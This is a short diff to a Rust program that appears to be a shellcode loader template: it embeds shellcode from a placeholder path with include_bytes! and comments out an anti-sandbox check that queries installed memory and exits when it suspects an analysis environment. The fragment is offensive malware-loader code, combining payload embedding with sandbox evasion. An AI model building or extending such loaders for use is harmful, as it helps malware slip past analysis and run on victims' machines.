@@ -63,7 +63,8 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    
+    // Removing the sandobox check for now, as it fails on numerous Windows versions.
+    /*
     let mut memory = 0;
     unsafe {
         let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
@@ -72,7 +73,7 @@ fn main() {
             panic!("Hello.")
         }
     }
-
+    */
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
